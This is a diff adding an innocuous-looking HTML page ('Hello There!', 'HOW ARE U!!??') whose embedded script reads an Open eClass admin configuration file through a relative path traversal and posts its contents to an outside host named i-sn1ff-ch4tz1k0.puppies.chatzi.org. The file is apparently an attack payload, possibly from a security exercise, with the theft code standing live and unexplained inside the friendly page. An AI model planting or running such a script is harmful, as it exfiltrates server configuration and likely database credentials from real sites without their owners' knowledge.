@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+
+<html>
+
+  <head>
+    <title>Hello There!</title>
+  </head>
+
+  <body>
+    <h1>HOW ARE U!!??</h1>
+
+    <script>
+        const endpoint = 'http://i-sn1ff-ch4tz1k0.puppies.chatzi.org/';
+        const filePath = '../../../../modules/admin/eclassconf.php';
+
+        fetch(filePath).then(response => response.text()).then(fileContent => {
+
+            const formData = new FormData();
+            formData.append('fileContent', fileContent);
+
+            fetch(endpoint, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+            })
+        })
+    </script>
+
+  </body>
+
+</html>
